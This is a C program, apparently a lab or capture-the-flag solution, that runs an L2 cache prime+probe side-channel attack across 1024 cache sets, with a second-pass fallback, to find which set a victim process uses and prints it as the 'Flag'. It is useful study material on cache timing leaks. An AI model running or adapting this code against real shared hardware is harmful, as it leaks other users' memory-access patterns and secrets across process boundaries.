#include "util.h"
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define HUGE_PAGE_SIZE (2 * 1024 * 1024)
#define L2_STEP_SIZE 65536
#define NUM_L2_CACHE_SETS 1024
#define L2_WAYS 16
#define ROUNDS 3500
#define WAIT_ITERS 2500
#define V2_WAYS 15
#define V2_TAG_BASE 16
#define V2_ROUNDS 3500
#define V2_WAIT_ITERS 4500
#define V2_MISS_THRESHOLD 140
#define V2_UPPER_MISS_THRESHOLD 800

// Allocate a 2MB huge page buffer for cache eviction and probing.
static uint8_t* allocate_huge_page(void) {
    uint8_t *buffer = mmap(NULL, HUGE_PAGE_SIZE, PROT_READ | PROT_WRITE,
                           MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    if (buffer == (void*)-1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    return buffer;
}

// Get the starting address of the target cache set in the buffer.
static inline uint8_t* get_set_addr(uint8_t *buffer, int target_set) {
    return buffer + (target_set << 6);
}

// Prime the target cache set by accessing 'ways' addresses that map to it.
static void prime_set_n(uint8_t *buffer, int target_set, int ways) {
    uint8_t *set_addr = get_set_addr(buffer, target_set);
    volatile uint8_t tmp;
    // Access each address in the set to load it into the cache.
    for (int i = 0; i < ways; i++) {
        uint8_t *addr = set_addr + (i * L2_STEP_SIZE);
        tmp = *addr;
        asm volatile("mfence" ::: "memory");
    }
    (void)tmp;
}

// Probe the target cache set by measuring access times to 'ways' addresses and summing the cycles.
static int probe_set_cycles_n(uint8_t *buffer, int target_set, int ways) {
    uint8_t *set_addr = get_set_addr(buffer, target_set);
    int total_cycles = 0;
    // Access each address in the set and sum the access times to detect evictions.
    for (int i = 0; i < ways; i++) {
        int mixed_i = (i * 5) % ways;
        uint8_t *addr = set_addr + (mixed_i * L2_STEP_SIZE);
        asm volatile("lfence" ::: "memory");
        total_cycles += (int)measure_one_block_access_time((ADDR_PTR)addr);
        asm volatile("lfence" ::: "memory");
    }
    return total_cycles;
}

// Victim-2: Prime the target cache set by accessing a specific subset of addresses that map to it.
static void prime_set_v2(uint8_t *buffer, int target_set) {
    uint8_t *set_addr = get_set_addr(buffer, target_set);
    volatile uint8_t tmp;
    // Access a specific subset of addresses in the set to load them into the cache, leaving one way unaccessed.
    for (int i = 0; i < V2_WAYS; i++) {
        int tag_idx = V2_TAG_BASE + i;
        // Skip one way to create a known eviction pattern for the victim-2 attack.
        uint8_t *addr = set_addr + (tag_idx * L2_STEP_SIZE);
        tmp = *addr;
        asm volatile("mfence" ::: "memory");
    }
    (void)tmp;
}

// Victim-2: Probe the target cache set by measuring access times to the specific subset of addresses and counting misses based on timing thresholds.
static int probe_set_misses_v2(uint8_t *buffer, int target_set) {
    uint8_t *set_addr = get_set_addr(buffer, target_set);
    int misses = 0;
    // Access the specific subset of addresses in the set and count how many accesses are misses based on timing thresholds.
    for (int i = 0; i < V2_WAYS; i++) {
        int mixed_i = (i * 7) % V2_WAYS;
        int tag_idx = V2_TAG_BASE + mixed_i;
        uint8_t *addr = set_addr + (tag_idx * L2_STEP_SIZE);
        asm volatile("lfence" ::: "memory");
        int t = (int)measure_one_block_access_time((ADDR_PTR)addr);
        asm volatile("lfence" ::: "memory");
        if (t > V2_MISS_THRESHOLD && t < V2_UPPER_MISS_THRESHOLD) {
            misses++;
        }
    }
    return misses;
}

int main(int argc, char const *argv[]) {
    int scores[NUM_L2_CACHE_SETS] = {0};
    long long v2_scores[NUM_L2_CACHE_SETS] = {0};
    uint8_t *buffer = allocate_huge_page();

    (void)argc;
    (void)argv;
    
    // Initialize the buffer to ensure all pages are mapped and avoid page faults during timing measurements.
    for (int i = 0; i < HUGE_PAGE_SIZE; i += 4096) {
        buffer[i] = 1;
    }

    // For each round, prime and probe each cache set to gather timing data and identify the most likely victim cache set based on access times.
    for (int r = 0; r < ROUNDS; r++) {
        for (int step = 0; step < NUM_L2_CACHE_SETS; step++) {
            int set_idx = (step * 167) & 0x3FF;
            prime_set_n(buffer, set_idx, L2_WAYS);

            for (volatile int w = 0; w < WAIT_ITERS; w++) {}

            scores[set_idx] += probe_set_cycles_n(buffer, set_idx, L2_WAYS);
        }
    }

    // Identify the cache set with the highest score (most likely victim) and the second highest for confidence comparison.
    int best_idx = 0;
    int second_idx = 1;
    if (scores[second_idx] > scores[best_idx]) {
        int t = best_idx;
        best_idx = second_idx;
        second_idx = t;
    }
    // Iterate through the scores to find the best and second-best cache sets based on the accumulated timing data.
    for (int i = 2; i < NUM_L2_CACHE_SETS; i++) {
        if (scores[i] > scores[best_idx]) {
            second_idx = best_idx;
            best_idx = i;
        } else if (scores[i] > scores[second_idx]) {
            second_idx = i;
        }
    }
    int flag = best_idx;

    // Victim-2 fallback only when primary confidence is weak.
    if ((scores[best_idx] - scores[second_idx]) < 12000) {
        for (int r = 0; r < V2_ROUNDS; r++) {
            for (int step = 0; step < NUM_L2_CACHE_SETS; step++) {
                int set_idx = (step * 167) & 0x3FF;
                prime_set_v2(buffer, set_idx);
                int immediate = probe_set_misses_v2(buffer, set_idx);

                prime_set_v2(buffer, set_idx);
                for (volatile int w = 0; w < V2_WAIT_ITERS; w++) {}
                int delayed = probe_set_misses_v2(buffer, set_idx);

                v2_scores[set_idx] += (long long)(delayed - immediate);
            }
        }
        
        int v2_best = 0;
        for (int i = 1; i < NUM_L2_CACHE_SETS; i++) {
            if (v2_scores[i] > v2_scores[v2_best]) {
                v2_best = i;
            }
        }
        flag = v2_best;
    }

    printf("Flag: %d\n", flag);
    return 0;
}
